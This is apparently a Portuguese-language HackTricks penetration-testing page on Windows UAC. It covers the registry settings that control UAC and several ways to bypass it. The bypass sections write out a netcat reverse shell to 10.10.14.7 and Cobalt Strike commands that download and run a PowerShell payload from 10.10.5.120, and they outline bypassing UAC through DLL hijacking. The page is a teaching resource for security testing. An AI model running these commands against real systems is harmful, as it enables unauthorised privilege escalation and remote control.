# UAC - Controle de Conta de Usuário

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

O Controle de Conta de Usuário (UAC) é um recurso que permite um **prompt de consentimento para atividades elevadas**. As aplicações têm diferentes níveis de `integridade`, e um programa com um **alto nível** pode realizar tarefas que **potencialmente comprometem o sistema**. Quando o UAC está habilitado, as aplicações e tarefas sempre **executam sob o contexto de segurança de uma conta não administrativa**, a menos que um administrador autorize explicitamente essas aplicações/tarefas a terem acesso de nível administrativo ao sistema para executar. É um recurso de conveniência que protege os administradores de alterações não intencionais, mas não é considerado uma fronteira de segurança.

Para mais informações sobre níveis de integridade:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: uma chave de usuário padrão, para realizar ações regulares em nível regular, e uma com privilégios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute como o UAC funciona em grande profundidade e inclui o processo de logon, experiência do usuário e arquitetura do UAC. Os administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização em nível local (usando secpol.msc), ou configurado e distribuído via Objetos de Política de Grupo (GPO) em um ambiente de domínio Active Directory. As várias configurações são discutidas em detalhes [aqui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Existem 10 configurações de Política de Grupo que podem ser definidas para o UAC. A tabela a seguir fornece detalhes adicionais:

| Configuração de Política de Grupo                                                                                                                                                                                                                                                                                                                                                           | Chave do Registro            | Configuração padrão                                           |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ------------------------------------------------------------ |
| [Modo de aprovação do administrador de Controle de Conta de Usuário para a conta de administrador integrada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Desativado                                                    |
| [Permitir que aplicativos UIAccess solicitem elevação sem usar a área de trabalho segura](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Desativado                                                    |
| [Comportamento do prompt de elevação para administradores no Modo de Aprovação do Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimento para binários não-Windows             |
| [Comportamento do prompt de elevação para usuários padrão](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciais na área de trabalho segura              |
| [Detectar instalações de aplicativos e solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Habilitado (padrão para home) Desativado (padrão para empresa) |
| [Elevação somente de executáveis assinados e validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Desativado                                                    |
| [Elevação somente de aplicativos UIAccess instalados em locais seguros](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                    |
| [Executar todos os administradores no Modo de Aprovação do Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                    |
| [Alternar para a área de trabalho segura ao solicitar elevação](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Habilitado                                                    |
| [Virtualizar falhas de gravação de arquivos e registro em locais por
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
Se o valor for **`1`**, o UAC está **ativado**. Se o valor for **`0`** ou **não existir**, então o UAC está **inativo**.

Em seguida, verifique **qual nível** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Se **`0`**, o UAC não será solicitado (como **desativado**)
* Se **`1`**, o administrador é **solicitado a fornecer nome de usuário e senha** para executar o binário com privilégios elevados (na Área de Trabalho Segura)
* Se **`2`** (**Sempre notificar**) o UAC sempre pedirá confirmação ao administrador quando ele tentar executar algo com privilégios elevados (na Área de Trabalho Segura)
* Se **`3`** é como `1`, mas não é necessário na Área de Trabalho Segura
* Se **`4`** é como `2`, mas não é necessário na Área de Trabalho Segura
* Se **`5`** (**padrão**), o administrador será solicitado a confirmar a execução de binários não Windows com privilégios elevados

Em seguida, você deve verificar o valor de **`LocalAccountTokenFilterPolicy`**\
Se o valor for **`0`**, apenas o usuário **RID 500** (**Administrador integrado**) pode executar **tarefas de administrador sem UAC**, e se for `1`, **todas as contas dentro do grupo "Administradores"** podem fazê-lo.

E, finalmente, verifique o valor da chave **`FilterAdministratorToken`**\
Se **`0`** (padrão), a conta **Administrador integrado pode** fazer tarefas de administração remota e se **`1`**, a conta integrada Administrador **não pode** fazer tarefas de administração remota, a menos que `LocalAccountTokenFilterPolicy` seja definido como `1`.

#### Resumo

* Se `EnableLUA=0` ou **não existir**, **nenhum UAC para ninguém**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1` , Nenhum UAC para ninguém**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=0`, Nenhum UAC para RID 500 (Administrador integrado)**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=1`, UAC para todos**

Todas essas informações podem ser obtidas usando o módulo **metasploit**: `post/windows/gather/win_privs`

Você também pode verificar os grupos do seu usuário e obter o nível de integridade:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass do UAC

{% hint style="info" %}
Observe que se você tiver acesso gráfico à vítima, o bypass do UAC é direto, pois você pode simplesmente clicar em "Sim" quando a solicitação do UAC aparecer.
{% endhint %}

O bypass do UAC é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil contornar o UAC se ele estiver no nível de segurança mais alto (Sempre) do que se estiver em qualquer um dos outros níveis (Padrão).**

### UAC desativado

Se o UAC já estiver desativado (`ConsentPromptBehaviorAdmin` é **`0`**), você pode **executar um shell reverso com privilégios de administrador** (alto nível de integridade) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass do UAC com duplicação de token

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Bypass **muito** básico do UAC (acesso completo ao sistema de arquivos)

Se você tiver um shell com um usuário que está dentro do grupo Administradores, você pode **montar o compartilhamento C$** via SMB (sistema de arquivos) localmente em um novo disco e você terá **acesso a tudo dentro do sistema de arquivos** (até mesmo a pasta home do Administrador).

{% hint style="warning" %}
**Parece que esse truque não funciona mais**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass de UAC com cobalt strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver configurado no nível máximo de segurança.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também possuem vários módulos para **burlar** o **UAC**.

### Explorações de burla do UAC

[**UACME**](https://github.com/hfiref0x/UACME) é uma **compilação** de várias explorações de burla do UAC. Note que você precisará **compilar o UACME usando o Visual Studio ou o MSBuild**. A compilação criará vários executáveis (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), você precisará saber **qual deles você precisa**.\
Você deve **ter cuidado** porque algumas burlas irão **solicitar que outros programas** alertem o **usuário** de que algo está acontecendo.

O UACME tem a **versão de compilação a partir da qual cada técnica começou a funcionar**. Você pode procurar por uma técnica que afete suas versões:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Além disso, usando [esta](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) página, você obtém a versão do Windows `1607` a partir das versões de compilação.

#### Mais bypass do UAC

**Todas** as técnicas usadas aqui para contornar o UAC **exigem** um **shell interativo completo** com a vítima (um shell nc.exe comum não é suficiente).

Você pode obter isso usando uma sessão **meterpreter**. Migre para um **processo** que tenha o valor **Session** igual a **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ deve funcionar)

### Bypass do UAC com GUI

Se você tiver acesso a uma **GUI, pode simplesmente aceitar o prompt do UAC** quando o receber, você realmente não precisa de um bypass. Portanto, ter acesso a uma GUI permitirá que você contorne o UAC.

Além disso, se você obtiver uma sessão GUI que alguém estava usando (potencialmente via RDP), há **algumas ferramentas que serão executadas como administrador** de onde você poderá **executar** um **cmd** por exemplo, **como admin** diretamente sem ser solicitado novamente pelo UAC, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **furtivo**.

### Bypass do UAC de força bruta barulhento

Se você não se importa em ser barulhento, sempre pode **executar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **pede para elevar as permissões até que o usuário aceite**.

### Seu próprio bypass - Metodologia básica de bypass do UAC

Se você der uma olhada no **UACME**, notará que **a maioria dos bypasses do UAC abusa de uma vulnerabilidade de Dll Hijacking** (principalmente escrevendo a dll maliciosa em _C:\Windows\System32_). [Leia isto para aprender como encontrar uma vulnerabilidade de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Encontre um binário que **autoeleve** (verifique se, quando for executado, ele é executado em um nível de integridade alto).
2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que possam ser vulneráveis ​​ao **DLL Hijacking**.
3. Provavelmente, você precisará **escrever** a DLL dentro de alguns **caminhos protegidos** (como C:\Windows\System32), onde você não tem permissões de gravação. Você pode contornar isso usando:
   1. **wusa.exe**: Windows 7,8 e 8.1. Ele permite extrair o conteúdo de um arquivo CAB dentro de caminhos protegidos (porque essa ferramenta é executada em um nível de integridade alto).
   2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL dentro do caminho protegido e executar o binário vulnerável e autoelevado.

### Outra técnica de bypass do UAC

Consiste em observar se um binário **autoeleve** tenta **ler** do **registro** o **nome/caminho** de um **binário** ou **comando** a ser **executado** (isso é mais interessante se o binário procurar essas informações dentro do **HKCU**).

![](<../../.gitbook/assets/image (9) (1) (2).png>)

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para criar e **automatizar fluxos de trabalho** com as ferramentas da comunidade mais avançadas do mundo.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
